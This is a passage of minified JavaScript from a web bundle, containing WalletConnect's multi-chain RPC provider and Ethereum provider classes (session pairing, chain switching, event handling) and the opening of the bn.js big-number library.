e=this.namespace.accounts;return e?[...new Set(e.filter((e=>e.split(":")[1]===this.chainId.toString())).map((e=>e.split(":")[2])))]:[]}getHttpProvider(){const e=this.chainId,t=this.httpProviders[e];if(typeof t>"u")throw new Error(`JSON-RPC provider for ${e} not found`);return t}async handleSwitchChain(e){var t,r;let n=e.request.params?null==(t=e.request.params[0])?void 0:t.chainId:"0x0";n=n.startsWith("0x")?n:`0x${n}`;const i=parseInt(n,16);if(this.isChainApproved(i))this.setDefaultChain(`${i}`);else{if(!this.namespace.methods.includes("wallet_switchEthereumChain"))throw new Error(`Failed to switch to chain 'eip155:${i}'. The chain is not approved or the wallet does not support 'wallet_switchEthereumChain' method.`);await this.client.request({topic:e.topic,request:{method:e.request.method,params:[{chainId:n}]},chainId:null==(r=this.namespace.chains)?void 0:r[0]}),this.setDefaultChain(`${i}`)}return null}isChainApproved(e){return this.namespace.chains.includes(`${this.name}:${e}`)}}class LQ{constructor(e){this.name="solana",this.namespace=e.namespace,this.events=jr("events"),this.client=jr("client"),this.chainId=this.getDefaultChain(),this.httpProviders=this.createHttpProviders()}updateNamespace(e){this.namespace=Object.assign(this.namespace,e)}requestAccounts(){return this.getAccounts()}request(e){return this.namespace.methods.includes(e.request.method)?this.client.request(e):this.getHttpProvider().request(e.request)}setDefaultChain(e,t){this.httpProviders[e]||this.setHttpProvider(e,t),this.chainId=e,this.events.emit(Ja.DEFAULT_CHAIN_CHANGED,`${this.name}:${e}`)}getDefaultChain(){if(this.chainId)return this.chainId;if(this.namespace.defaultChain)return this.namespace.defaultChain;const e=this.namespace.chains[0];if(!e)throw new Error("ChainId not found");return e.split(":")[1]}getAccounts(){const e=this.namespace.accounts;return e?[...new Set(e.filter((e=>e.split(":")[1]===this.chainId.toString())).map((e=>e.split(":")[2])))]:[]}createHttpProviders(){const e={};return this.namespace.chains.forEach((t=>{var r;const n=uu(t);e[n]=this.createHttpProvider(n,null==(r=this.namespace.rpcMap)?void 0:r[t])})),e}getHttpProvider(){const e=`${this.name}:${this.chainId}`,t=this.httpProviders[e];if(typeof t>"u")throw new Error(`JSON-RPC provider for ${e} not found`);return t}setHttpProvider(e,t){const r=this.createHttpProvider(e,t);r&&(this.httpProviders[e]=r)}createHttpProvider(e,t){const r=t||$c(e,this.namespace,this.client.core.projectId);if(!r)throw new Error(`No RPC url provided for chainId: ${e}`);return new Ka(new Kc(r,jr("disableProviderPing")))}}class BQ{constructor(e){this.name="cosmos",this.namespace=e.namespace,this.events=jr("events"),this.client=jr("client"),this.chainId=this.getDefaultChain(),this.httpProviders=this.createHttpProviders()}updateNamespace(e){this.namespace=Object.assign(this.namespace,e)}requestAccounts(){return this.getAccounts()}getDefaultChain(){if(this.chainId)return this.chainId;if(this.namespace.defaultChain)return this.namespace.defaultChain;const e=this.namespace.chains[0];if(!e)throw new Error("ChainId not found");return e.split(":")[1]}request(e){return this.namespace.methods.includes(e.request.method)?this.client.request(e):this.getHttpProvider().request(e.request)}setDefaultChain(e,t){this.httpProviders[e]||this.setHttpProvider(e,t),this.chainId=e,this.events.emit(Ja.DEFAULT_CHAIN_CHANGED,`${this.name}:${this.chainId}`)}getAccounts(){const e=this.namespace.accounts;return e?[...new Set(e.filter((e=>e.split(":")[1]===this.chainId.toString())).map((e=>e.split(":")[2])))]:[]}createHttpProviders(){const e={};return this.namespace.chains.forEach((t=>{var r;const n=uu(t);e[n]=this.createHttpProvider(n,null==(r=this.namespace.rpcMap)?void 0:r[t])})),e}getHttpProvider(){const e=`${this.name}:${this.chainId}`,t=this.httpProviders[e];if(typeof t>"u")throw new Error(`JSON-RPC provider for ${e} not found`);return t}setHttpProvider(e,t){const r=this.createHttpProvider(e,t);r&&(this.httpProviders[e]=r)}createHttpProvider(e,t){const r=t||$c(e,this.namespace,this.client.core.projectId);if(!r)throw new Error(`No RPC url provided for chainId: ${e}`);return new Ka(new Kc(r,jr("disableProviderPing")))}}class FQ{constructor(e){this.name="cip34",this.namespace=e.namespace,this.events=jr("events"),this.client=jr("client"),this.chainId=this.getDefaultChain(),this.httpProviders=this.createHttpProviders()}updateNamespace(e){this.namespace=Object.assign(this.namespace,e)}requestAccounts(){return this.getAccounts()}getDefaultChain(){if(this.chainId)return this.chainId;if(this.namespace.defaultChain)return this.namespace.defaultChain;const e=this.namespace.chains[0];if(!e)throw new Error("ChainId not found");return e.split(":")[1]}request(e){return this.namespace.methods.includes(e.request.method)?this.client.request(e):this.getHttpProvider().request(e.request)}setDefaultChain(e,t){this.httpProviders[e]||this.setHttpProvider(e,t),this.chainId=e,this.events.emit(Ja.DEFAULT_CHAIN_CHANGED,`${this.name}:${this.chainId}`)}getAccounts(){const e=this.namespace.accounts;return e?[...new Set(e.filter((e=>e.split(":")[1]===this.chainId.toString())).map((e=>e.split(":")[2])))]:[]}createHttpProviders(){const e={};return this.namespace.chains.forEach((t=>{const r=this.getCardanoRPCUrl(t),n=uu(t);e[n]=this.createHttpProvider(n,r)})),e}getHttpProvider(){const e=`${this.name}:${this.chainId}`,t=this.httpProviders[e];if(typeof t>"u")throw new Error(`JSON-RPC provider for ${e} not found`);return t}getCardanoRPCUrl(e){const t=this.namespace.rpcMap;if(t)return t[e]}setHttpProvider(e,t){const r=this.createHttpProvider(e,t);r&&(this.httpProviders[e]=r)}createHttpProvider(e,t){const r=t||this.getCardanoRPCUrl(e);if(!r)throw new Error(`No RPC url provided for chainId: ${e}`);return new Ka(new Kc(r,jr("disableProviderPing")))}}class jQ{constructor(e){this.name="elrond",this.namespace=e.namespace,this.events=jr("events"),this.client=jr("client"),this.chainId=this.getDefaultChain(),this.httpProviders=this.createHttpProviders()}updateNamespace(e){this.namespace=Object.assign(this.namespace,e)}requestAccounts(){return this.getAccounts()}request(e){return this.namespace.methods.includes(e.request.method)?this.client.request(e):this.getHttpProvider().request(e.request)}setDefaultChain(e,t){this.httpProviders[e]||this.setHttpProvider(e,t),this.chainId=e,this.events.emit(Ja.DEFAULT_CHAIN_CHANGED,`${this.name}:${e}`)}getDefaultChain(){if(this.chainId)return this.chainId;if(this.namespace.defaultChain)return this.namespace.defaultChain;const e=this.namespace.chains[0];if(!e)throw new Error("ChainId not found");return e.split(":")[1]}getAccounts(){const e=this.namespace.accounts;return e?[...new Set(e.filter((e=>e.split(":")[1]===this.chainId.toString())).map((e=>e.split(":")[2])))]:[]}createHttpProviders(){const e={};return this.namespace.chains.forEach((t=>{var r;const n=uu(t);e[n]=this.createHttpProvider(n,null==(r=this.namespace.rpcMap)?void 0:r[t])})),e}getHttpProvider(){const e=`${this.name}:${this.chainId}`,t=this.httpProviders[e];if(typeof t>"u")throw new Error(`JSON-RPC provider for ${e} not found`);return t}setHttpProvider(e,t){const r=this.createHttpProvider(e,t);r&&(this.httpProviders[e]=r)}createHttpProvider(e,t){const r=t||$c(e,this.namespace,this.client.core.projectId);if(!r)throw new Error(`No RPC url provided for chainId: ${e}`);return new Ka(new Kc(r,jr("disableProviderPing")))}}class UQ{constructor(e){this.name="multiversx",this.namespace=e.namespace,this.events=jr("events"),this.client=jr("client"),this.chainId=this.getDefaultChain(),this.httpProviders=this.createHttpProviders()}updateNamespace(e){this.namespace=Object.assign(this.namespace,e)}requestAccounts(){return this.getAccounts()}request(e){return this.namespace.methods.includes(e.request.method)?this.client.request(e):this.getHttpProvider().request(e.request)}setDefaultChain(e,t){this.httpProviders[e]||this.setHttpProvider(e,t),this.chainId=e,this.events.emit(Ja.DEFAULT_CHAIN_CHANGED,`${this.name}:${e}`)}getDefaultChain(){if(this.chainId)return this.chainId;if(this.namespace.defaultChain)return this.namespace.defaultChain;const e=this.namespace.chains[0];if(!e)throw new Error("ChainId not found");return e.split(":")[1]}getAccounts(){const e=this.namespace.accounts;return e?[...new Set(e.filter((e=>e.split(":")[1]===this.chainId.toString())).map((e=>e.split(":")[2])))]:[]}createHttpProviders(){const e={};return this.namespace.chains.forEach((t=>{var r;const n=uu(t);e[n]=this.createHttpProvider(n,null==(r=this.namespace.rpcMap)?void 0:r[t])})),e}getHttpProvider(){const e=`${this.name}:${this.chainId}`,t=this.httpProviders[e];if(typeof t>"u")throw new Error(`JSON-RPC provider for ${e} not found`);return t}setHttpProvider(e,t){const r=this.createHttpProvider(e,t);r&&(this.httpProviders[e]=r)}createHttpProvider(e,t){const r=t||$c(e,this.namespace,this.client.core.projectId);if(!r)throw new Error(`No RPC url provided for chainId: ${e}`);return new Ka(new Kc(r,jr("disableProviderPing")))}}class WQ{constructor(e){this.name="near",this.namespace=e.namespace,this.events=jr("events"),this.client=jr("client"),this.chainId=this.getDefaultChain(),this.httpProviders=this.createHttpProviders()}updateNamespace(e){this.namespace=Object.assign(this.namespace,e)}requestAccounts(){return this.getAccounts()}getDefaultChain(){if(this.chainId)return this.chainId;if(this.namespace.defaultChain)return this.namespace.defaultChain;const e=this.namespace.chains[0];if(!e)throw new Error("ChainId not found");return e.split(":")[1]}request(e){return this.namespace.methods.includes(e.request.method)?this.client.request(e):this.getHttpProvider().request(e.request)}setDefaultChain(e,t){if(this.chainId=e,!this.httpProviders[e]){const r=t||$c(`${this.name}:${e}`,this.namespace);if(!r)throw new Error(`No RPC url provided for chainId: ${e}`);this.setHttpProvider(e,r)}this.events.emit(Ja.DEFAULT_CHAIN_CHANGED,`${this.name}:${this.chainId}`)}getAccounts(){const e=this.namespace.accounts;return e&&e.filter((e=>e.split(":")[1]===this.chainId.toString())).map((e=>e.split(":")[2]))||[]}createHttpProviders(){const e={};return this.namespace.chains.forEach((t=>{var r;e[t]=this.createHttpProvider(t,null==(r=this.namespace.rpcMap)?void 0:r[t])})),e}getHttpProvider(){const e=`${this.name}:${this.chainId}`,t=this.httpProviders[e];if(typeof t>"u")throw new Error(`JSON-RPC provider for ${e} not found`);return t}setHttpProvider(e,t){const r=this.createHttpProvider(e,t);r&&(this.httpProviders[e]=r)}createHttpProvider(e,t){const r=t||$c(e,this.namespace);return typeof r>"u"?void 0:new Ka(new Kc(r,jr("disableProviderPing")))}}var zQ=Object.defineProperty,HQ=Object.defineProperties,qQ=Object.getOwnPropertyDescriptors,Zx=Object.getOwnPropertySymbols,VQ=Object.prototype.hasOwnProperty,GQ=Object.prototype.propertyIsEnumerable,Qx=(e,t,r)=>t in e?zQ(e,t,{enumerable:!0,configurable:!0,writable:!0,value:r}):e[t]=r,S1=(e,t)=>{for(var r in t||(t={}))VQ.call(t,r)&&Qx(e,r,t[r]);if(Zx)for(var r of Zx(t))GQ.call(t,r)&&Qx(e,r,t[r]);return e},Uw=(e,t)=>HQ(e,qQ(t));class a_{constructor(e){this.events=new U3,this.rpcProviders={},this.shouldAbortPairingAttempt=!1,this.maxPairingAttempts=10,this.disableProviderPing=!1,this.providerOpts=e,this.logger=typeof(null==e?void 0:e.logger)<"u"&&"string"!=typeof(null==e?void 0:e.logger)?e.logger:nr.pino(nr.getDefaultLoggerOptions({level:(null==e?void 0:e.logger)||qx})),this.disableProviderPing=(null==e?void 0:e.disableProviderPing)||!1}static async init(e){const t=new a_(e);return await t.initialize(),t}async request(e,t){const[r,n]=this.validateChain(t);if(!this.session)throw new Error("Please call connect() before request()");return await this.getProvider(r).request({request:S1({},e),chainId:`${r}:${n}`,topic:this.session.topic})}sendAsync(e,t,r){this.request(e,r).then((e=>t(null,e))).catch((e=>t(e,void 0)))}async enable(){if(!this.client)throw new Error("Sign Client not initialized");return this.session||await this.connect({namespaces:this.namespaces,optionalNamespaces:this.optionalNamespaces,sessionProperties:this.sessionProperties}),await this.requestAccounts()}async disconnect(){var e;if(!this.session)throw new Error("Please call connect() before enable()");await this.client.disconnect({topic:null==(e=this.session)?void 0:e.topic,reason:nn("USER_DISCONNECTED")}),await this.cleanup()}async connect(e){if(!this.client)throw new Error("Sign Client not initialized");if(this.setNamespaces(e),await this.cleanupPendingPairings(),!e.skipPairing)return await this.pair(e.pairingTopic)}on(e,t){this.events.on(e,t)}once(e,t){this.events.once(e,t)}removeListener(e,t){this.events.removeListener(e,t)}off(e,t){this.events.off(e,t)}get isWalletConnect(){return!0}async pair(e){this.shouldAbortPairingAttempt=!1;let t=0;do{if(this.shouldAbortPairingAttempt)throw new Error("Pairing aborted");if(t>=this.maxPairingAttempts)throw new Error("Max auto pairing attempts reached");const{uri:r,approval:n}=await this.client.connect({pairingTopic:e,requiredNamespaces:this.namespaces,optionalNamespaces:this.optionalNamespaces,sessionProperties:this.sessionProperties});r&&(this.uri=r,this.events.emit("display_uri",r)),await n().then((e=>{this.session=e,this.namespaces||(this.namespaces=kQ(e.namespaces),this.persist("namespaces",this.namespaces))})).catch((e=>{if(e.message!==BI)throw e;t++}))}while(!this.session);return this.onConnect(),this.session}setDefaultChain(e,t){try{if(!this.session)return;const[r,n]=this.validateChain(e);this.getProvider(r).setDefaultChain(n,t)}catch(e){if(!/Please call connect/.test(e.message))throw e}}async cleanupPendingPairings(e={}){this.logger.info("Cleaning up inactive pairings...");const t=this.client.pairing.getAll();if(ta(t)){for(const r of t)e.deletePairings?this.client.core.expirer.set(r.topic,0):await this.client.core.relayer.subscriber.unsubscribe(r.topic);this.logger.info(`Inactive pairings cleared: ${t.length}`)}}abortPairingAttempt(){this.shouldAbortPairingAttempt=!0}async checkStorage(){if(this.namespaces=await this.getFromStore("namespaces"),this.optionalNamespaces=await this.getFromStore("optionalNamespaces")||{},this.client.session.length){const e=this.client.session.keys.length-1;this.session=this.client.session.get(this.client.session.keys[e]),this.createProviders()}}async initialize(){this.logger.trace("Initialized"),await this.createClient(),await this.checkStorage(),this.registerEventListeners()}async createClient(){this.client=this.providerOpts.client||await mQ.init({logger:this.providerOpts.logger||qx,relayUrl:this.providerOpts.relayUrl||_Q,projectId:this.providerOpts.projectId,metadata:this.providerOpts.metadata,storageOptions:this.providerOpts.storageOptions,storage:this.providerOpts.storage,name:this.providerOpts.name}),this.logger.trace("SignClient Initialized")}createProviders(){if(!this.client)throw new Error("Sign Client not initialized");if(!this.session)throw new Error("Session not initialized. Please call connect() before enable()");const e=[...new Set(Object.keys(this.session.namespaces).map((e=>yd(e))))];jw("client",this.client),jw("events",this.events),jw("disableProviderPing",this.disableProviderPing),e.forEach((e=>{if(!this.session)return;const t=OQ(e,this.session),r=jI(t),n=PQ(this.namespaces,this.optionalNamespaces),i=Uw(S1({},n[e]),{accounts:t,chains:r});switch(e){case"eip155":this.rpcProviders[e]=new $Q({namespace:i});break;case"solana":this.rpcProviders[e]=new LQ({namespace:i});break;case"cosmos":this.rpcProviders[e]=new BQ({namespace:i});break;case"polkadot":this.rpcProviders[e]=new DQ({namespace:i});break;case"cip34":this.rpcProviders[e]=new FQ({namespace:i});break;case"elrond":this.rpcProviders[e]=new jQ({namespace:i});break;case"multiversx":this.rpcProviders[e]=new UQ({namespace:i});break;case"near":this.rpcProviders[e]=new WQ({namespace:i})}}))}registerEventListeners(){if(typeof this.client>"u")throw new Error("Sign Client is not initialized");this.client.on("session_ping",(e=>{this.events.emit("session_ping",e)})),this.client.on("session_event",(e=>{const{params:t}=e,{event:r}=t;if("accountsChanged"===r.name){const e=r.data;e&&ta(e)&&this.events.emit("accountsChanged",e.map(MQ))}else if("chainChanged"===r.name){const e=t.chainId,r=t.event.data,n=yd(e),i=Fw(e)!==Fw(r)?`${n}:${Fw(r)}`:e;this.onChainChanged(i)}else this.events.emit(r.name,r.data);this.events.emit("session_event",e)})),this.client.on("session_update",(({topic:e,params:t})=>{var r;const{namespaces:n}=t,i=null==(r=this.client)?void 0:r.session.get(e);this.session=Uw(S1({},i),{namespaces:n}),this.onSessionUpdate(),this.events.emit("session_update",{topic:e,params:t})})),this.client.on("session_delete",(async e=>{await this.cleanup(),this.events.emit("session_delete",e),this.events.emit("disconnect",Uw(S1({},nn("USER_DISCONNECTED")),{data:e.topic}))})),this.on(Ja.DEFAULT_CHAIN_CHANGED,(e=>{this.onChainChanged(e,!0)}))}getProvider(e){if(!this.rpcProviders[e])throw new Error(`Provider not found: ${e}`);return this.rpcProviders[e]}onSessionUpdate(){Object.keys(this.rpcProviders).forEach((e=>{var t;this.getProvider(e).updateNamespace(null==(t=this.session)?void 0:t.namespaces[e])}))}setNamespaces(e){const{namespaces:t,optionalNamespaces:r,sessionProperties:n}=e;t&&Object.keys(t).length&&(this.namespaces=t),r&&Object.keys(r).length&&(this.optionalNamespaces=r),this.sessionProperties=n,this.persist("namespaces",t),this.persist("optionalNamespaces",r)}validateChain(e){const[t,r]=(null==e?void 0:e.split(":"))||["",""];if(!this.namespaces||!Object.keys(this.namespaces).length)return[t,r];if(t&&!Object.keys(this.namespaces||{}).map((e=>yd(e))).includes(t))throw new Error(`Namespace '${t}' is not configured. Please call connect() first with namespace config.`);if(t&&r)return[t,r];const n=yd(Object.keys(this.namespaces)[0]);return[n,this.rpcProviders[n].getDefaultChain()]}async requestAccounts(){const[e]=this.validateChain();return await this.getProvider(e).requestAccounts()}onChainChanged(e,t=!1){var r;if(!this.namespaces)return;const[n,i]=this.validateChain(e);t||this.getProvider(n).setDefaultChain(i),(null!=(r=this.namespaces[n])?r:this.namespaces[`${n}:${i}`]).defaultChain=i,this.persist("namespaces",this.namespaces),this.events.emit("chainChanged",i)}onConnect(){this.createProviders(),this.events.emit("connect",{session:this.session})}async cleanup(){this.session=void 0,this.namespaces=void 0,this.optionalNamespaces=void 0,this.sessionProperties=void 0,this.persist("namespaces",void 0),this.persist("optionalNamespaces",void 0),this.persist("sessionProperties",void 0),await this.cleanupPendingPairings({deletePairings:!0})}persist(e,t){this.client.core.storage.setItem(`${Vx}/${e}`,t)}async getFromStore(e){return await this.client.core.storage.getItem(`${Vx}/${e}`)}}const KQ=a_,JQ="wc",ZQ="ethereum_provider",QQ=`${JQ}@2:${ZQ}:`,YQ="https://rpc.walletconnect.com/v1/",P2=["eth_sendTransaction","personal_sign"],XQ=["eth_accounts","eth_requestAccounts","eth_sendRawTransaction","eth_sign","eth_signTransaction","eth_signTypedData","eth_signTypedData_v3","eth_signTypedData_v4","eth_sendTransaction","personal_sign","wallet_switchEthereumChain","wallet_addEthereumChain","wallet_getPermissions","wallet_requestPermissions","wallet_registerOnboarding","wallet_watchAsset","wallet_scanQRCode"],M2=["chainChanged","accountsChanged"],eY=["chainChanged","accountsChanged","message","disconnect","connect"];var tY=Object.defineProperty,rY=Object.defineProperties,nY=Object.getOwnPropertyDescriptors,Yx=Object.getOwnPropertySymbols,iY=Object.prototype.hasOwnProperty,sY=Object.prototype.propertyIsEnumerable,Xx=(e,t,r)=>t in e?tY(e,t,{enumerable:!0,configurable:!0,writable:!0,value:r}):e[t]=r,Ed=(e,t)=>{for(var r in t||(t={}))iY.call(t,r)&&Xx(e,r,t[r]);if(Yx)for(var r of Yx(t))sY.call(t,r)&&Xx(e,r,t[r]);return e},e8=(e,t)=>rY(e,nY(t));function jg(e){return Number(e[0].split(":")[1])}function Ww(e){return`0x${e.toString(16)}`}function oY(e){const{chains:t,optionalChains:r,methods:n,optionalMethods:i,events:o,optionalEvents:s,rpcMap:a}=e;if(!ta(t))throw new Error("Invalid chains");const c={chains:t,methods:n||P2,events:o||M2,rpcMap:Ed({},t.length?{[jg(t)]:a[jg(t)]}:{})},l=null==o?void 0:o.filter((e=>!M2.includes(e))),u=null==n?void 0:n.filter((e=>!P2.includes(e)));if(!(r||s||i||null!=l&&l.length||null!=u&&u.length))return{required:t.length?c:void 0};const h=(null==l?void 0:l.length)&&(null==u?void 0:u.length)||!r,d={chains:[...new Set(h?c.chains.concat(r||[]):r)],methods:[...new Set(c.methods.concat(null!=i&&i.length?i:XQ))],events:[...new Set(c.events.concat(null!=s&&s.length?s:eY))],rpcMap:a};return{required:t.length?c:void 0,optional:r.length?d:void 0}}let aY=class e{constructor(){this.events=new ai.EventEmitter,this.namespace="eip155",this.accounts=[],this.chainId=1,this.STORAGE_KEY=QQ,this.on=(e,t)=>(this.events.on(e,t),this),this.once=(e,t)=>(this.events.once(e,t),this),this.removeListener=(e,t)=>(this.events.removeListener(e,t),this),this.off=(e,t)=>(this.events.off(e,t),this),this.parseAccount=e=>this.isCompatibleChainId(e)?this.parseAccountId(e).address:e,this.signer={},this.rpc={}}static async init(t){const r=new e;return await r.initialize(t),r}async request(e){return await this.signer.request(e,this.formatChainId(this.chainId))}sendAsync(e,t){this.signer.sendAsync(e,t,this.formatChainId(this.chainId))}get connected(){return!!this.signer.client&&this.signer.client.core.relayer.connected}get connecting(){return!!this.signer.client&&this.signer.client.core.relayer.connecting}async enable(){return this.session||await this.connect(),await this.request({method:"eth_requestAccounts"})}async connect(e){if(!this.signer.client)throw new Error("Provider not initialized. Call init() first");this.loadConnectOpts(e);const{required:t,optional:r}=oY(this.rpc);try{const n=await new Promise((async(n,i)=>{var o;this.rpc.showQrModal&&(null==(o=this.modal)||o.subscribeModal((e=>{!e.open&&!this.signer.session&&(this.signer.abortPairingAttempt(),i(new Error("Connection request reset. Please try again.")))}))),await this.signer.connect(e8(Ed({namespaces:Ed({},t&&{[this.namespace]:t})},r&&{optionalNamespaces:{[this.namespace]:r}}),{pairingTopic:null==e?void 0:e.pairingTopic})).then((e=>{n(e)})).catch((e=>{i(new Error(e.message))}))}));if(!n)return;const i=Lq(n.namespaces,[this.namespace]);this.setChainIds(this.rpc.chains.length?this.rpc.chains:i),this.setAccounts(i),this.events.emit("connect",{chainId:Ww(this.chainId)})}catch(e){throw this.signer.logger.error(e),e}finally{this.modal&&this.modal.closeModal()}}async disconnect(){this.session&&await this.signer.disconnect(),this.reset()}get isWalletConnect(){return!0}get session(){return this.signer.session}registerEventListeners(){this.signer.on("session_event",(e=>{const{params:t}=e,{event:r}=t;"accountsChanged"===r.name?(this.accounts=this.parseAccounts(r.data),this.events.emit("accountsChanged",this.accounts)):"chainChanged"===r.name?this.setChainId(this.formatChainId(r.data)):this.events.emit(r.name,r.data),this.events.emit("session_event",e)})),this.signer.on("chainChanged",(e=>{const t=parseInt(e);this.chainId=t,this.events.emit("chainChanged",Ww(this.chainId)),this.persist()})),this.signer.on("session_update",(e=>{this.events.emit("session_update",e)})),this.signer.on("session_delete",(e=>{this.reset(),this.events.emit("session_delete",e),this.events.emit("disconnect",e8(Ed({},nn("USER_DISCONNECTED")),{data:e.topic,name:"USER_DISCONNECTED"}))})),this.signer.on("display_uri",(e=>{var t,r;this.rpc.showQrModal&&(null==(t=this.modal)||t.closeModal(),null==(r=this.modal)||r.openModal({uri:e})),this.events.emit("display_uri",e)}))}switchEthereumChain(e){this.request({method:"wallet_switchEthereumChain",params:[{chainId:e.toString(16)}]})}isCompatibleChainId(e){return"string"==typeof e&&e.startsWith(`${this.namespace}:`)}formatChainId(e){return`${this.namespace}:${e}`}parseChainId(e){return Number(e.split(":")[1])}setChainIds(e){const t=e.filter((e=>this.isCompatibleChainId(e))).map((e=>this.parseChainId(e)));t.length&&(this.chainId=t[0],this.events.emit("chainChanged",Ww(this.chainId)),this.persist())}setChainId(e){if(this.isCompatibleChainId(e)){const t=this.parseChainId(e);this.chainId=t,this.switchEthereumChain(t)}}parseAccountId(e){const[t,r,n]=e.split(":");return{chainId:`${t}:${r}`,address:n}}setAccounts(e){this.accounts=e.filter((e=>this.parseChainId(this.parseAccountId(e).chainId)===this.chainId)).map((e=>this.parseAccountId(e).address)),this.events.emit("accountsChanged",this.accounts)}getRpcConfig(e){var t,r;const n=null!=(t=null==e?void 0:e.chains)?t:[],i=null!=(r=null==e?void 0:e.optionalChains)?r:[],o=n.concat(i);if(!o.length)throw new Error("No chains specified in either `chains` or `optionalChains`");const s=n.length?(null==e?void 0:e.methods)||P2:[],a=n.length?(null==e?void 0:e.events)||M2:[],c=(null==e?void 0:e.optionalMethods)||[],l=(null==e?void 0:e.optionalEvents)||[],u=(null==e?void 0:e.rpcMap)||this.buildRpcMap(o,e.projectId),h=(null==e?void 0:e.qrModalOptions)||void 0;return{chains:null==n?void 0:n.map((e=>this.formatChainId(e))),optionalChains:i.map((e=>this.formatChainId(e))),methods:s,events:a,optionalMethods:c,optionalEvents:l,rpcMap:u,showQrModal:!(null==e||!e.showQrModal),qrModalOptions:h,projectId:e.projectId,metadata:e.metadata}}buildRpcMap(e,t){const r={};return e.forEach((e=>{r[e]=this.getRpcUrl(e,t)})),r}async initialize(e){if(this.rpc=this.getRpcConfig(e),this.chainId=this.rpc.chains.length?jg(this.rpc.chains):jg(this.rpc.optionalChains),this.signer=await KQ.init({projectId:this.rpc.projectId,metadata:this.rpc.metadata,disableProviderPing:e.disableProviderPing,relayUrl:e.relayUrl,storageOptions:e.storageOptions}),this.registerEventListeners(),await this.loadPersistedSession(),this.rpc.showQrModal){let e;try{const{WalletConnectModal:t}=await h2((()=>import("./ethereum-provider-b25bb000.js")),[]);e=t}catch{throw new Error("To use QR modal, please install @walletconnect/modal package")}if(e)try{this.modal=new e(Ed({walletConnectVersion:2,projectId:this.rpc.projectId,standaloneChains:this.rpc.chains},this.rpc.qrModalOptions))}catch(e){throw this.signer.logger.error(e),new Error("Could not generate WalletConnectModal Instance")}}}loadConnectOpts(e){if(!e)return;const{chains:t,optionalChains:r,rpcMap:n}=e;t&&ta(t)&&(this.rpc.chains=t.map((e=>this.formatChainId(e))),t.forEach((e=>{this.rpc.rpcMap[e]=(null==n?void 0:n[e])||this.getRpcUrl(e)}))),r&&ta(r)&&(this.rpc.optionalChains=[],this.rpc.optionalChains=null==r?void 0:r.map((e=>this.formatChainId(e))),r.forEach((e=>{this.rpc.rpcMap[e]=(null==n?void 0:n[e])||this.getRpcUrl(e)})))}getRpcUrl(e,t){var r;return(null==(r=this.rpc.rpcMap)?void 0:r[e])||`${YQ}?chainId=eip155:${e}&projectId=${t||this.rpc.projectId}`}async loadPersistedSession(){if(!this.session)return;const e=await this.signer.client.core.storage.getItem(`${this.STORAGE_KEY}/chainId`),t=this.session.namespaces[`${this.namespace}:${e}`]?this.session.namespaces[`${this.namespace}:${e}`]:this.session.namespaces[this.namespace];this.setChainIds(e?[this.formatChainId(e)]:null==t?void 0:t.accounts),this.setAccounts(null==t?void 0:t.accounts)}reset(){this.chainId=1,this.accounts=[]}persist(){this.session&&this.signer.client.core.storage.setItem(`${this.STORAGE_KEY}/chainId`,this.chainId)}parseAccounts(e){return"string"==typeof e||e instanceof String?[this.parseAccount(e)]:e.map((e=>this.parseAccount(e)))}};var c_={exports:{}};c_.exports,function(e,t){function r(e,t){if(!e)throw new Error(t||"Assertion failed")}function n(e,t){e.super_=t;var r=function(){};r.prototype=t.prototype,e.prototype=new r,e.prototype.constructor=e}function i(e,t,r){if(i.isBN(e))return e;this.negative=0,this.words=null,this.length=0,this.red=null,null!==e&&(("le"===t||"be"===t)&&(r=t,t=10),this._init(e||0,t||10,r||"be"))}var o;"object"==typeof e?e.exports=i:t.BN=i,i.BN=i,i.wordSize=26;try{o=typeof window<"u"&&typeof window.Buffer<"u"?window.Buffer:N0.Buffer}catch{}function s(e,t){var n=e.charCodeAt(t);return n>=48&&n<=57?n-48:n>=65&&n<=70?n-55:n>=97&&n<=102?n-87:void r(!1,"Invalid character in "+e)}function a(e,t,r){var n=s(e,r);return r-1>=t&&(n|=s(e,r-1)<<4),n}function c(e,t,n,i){for(var o=0,s=0,a=Math.min(e.length,n),c=t;c<a;c++){var l=e.charCodeAt(c)-48;o*=i,s=l>=49?l-49+10:l>=17?l-17+10:l,r(l>=0&&s<i,"Invalid character"),o+=s}return o}function l(e,t){e.words=t.words,e.length=t.length,e.negative=t.negative,e.red=t.red}if(i.isBN=function(e){return e instanceof i||null!==e&&"object"==typeof e&&e.constructor.wordSize===i.wordSize&&Array.isArray(e.words)},i.max=function(e,t){return e.cmp(t)>0?e:t},i.min=function(e,t){return e.cmp(t)<0?e:t},i.prototype._init=function(e,t,n){if("number"==typeof e)return this._initNumber(e,t,n);if("object"==typeof e)return this._initArray(e,t,n);"hex"===t&&(t=16),r(t===(0|t)&&t>=2&&t<=36);var i=0;"-"===(e=e.toString().replace(/\s+/g,""))[0]&&(i++,this.negative=1),i<e.length&&(16===t?this._parseHex(e,i,n):(this._parseBase(e,t,i),"le"===n&&this._initArray(this.toArray(),t,n)))},i.prototype._initNumber=function(e,t,n){e<0&&(this.negative=1,e=-e),e<67108864?(this.words=[67108863&e],this.length=1):e<4503599627370496?(this.words=[67108863&e,e/67108864&67108863],this.length=2):(r(e<9007199254740992),this.words=[67108863&e,e/67108864&67108863,1],this.length=3),"le"===n&&this._initArray(this.toArray(),t,n)},i.prototype._initArray=function(e,t,n){if(r("number"==typeof e.length),e.length<=0)return this.words=[0],this.length=1,this;this.length=Math.ceil(e.length/3),this.words=new Array(this.length);for(var i=0;i<this.length;i++)this.words[i]=0;var o,s,a=0;if("be"===n)for(i=e.length-1,o=0;i>=0;i-=3)s=e[i]|e[i-1]<<8|e[i-2]<<16,this.words[o]|=s<<a&67108863,this.words[o+1]=s>>>26-a&67108863,(a+=24)>=26&&(a-=26,o++);else if("le"===n)for(i=0,o=0;i<e.length;i+=3)s=e[i]|e[i+1]<<8|e[i+2]<<16,this.words[o]|=s<<a&67108863,this.words[o+1]=s>>>26-a&67108863,(a+=24)>=26&&(a-=26,o++);return this._strip()},i.prototype._parseHex=function(e,t,r){this.length=Math.ceil((e.length-t)/6),this.words=new Array(this.length);for(var n=0;n<this.length;n++)this.words[n]=0;var i,o=0,s=0;if("be"===r)for(n=e.length-1;n>=t;n-=2)i=a(e,t,n)<<o,this.words[s]|=67108863&i,o>=18?(o-=18,s+=1,this.words[s]|=i>>>26):o+=8;else for(n=(e.length-t)%2==0?t+1:t;n<e.length;n+=2)i=a(e,t,n)<<o,this.words[s]|=67108863&i,o>=18?(o-=18,s+=1,this.words[s]|=i>>>26):o+=8;this._strip()},i.prototype._parseBase=function(e,t,r){this.words=[0],this.length=1;for(var 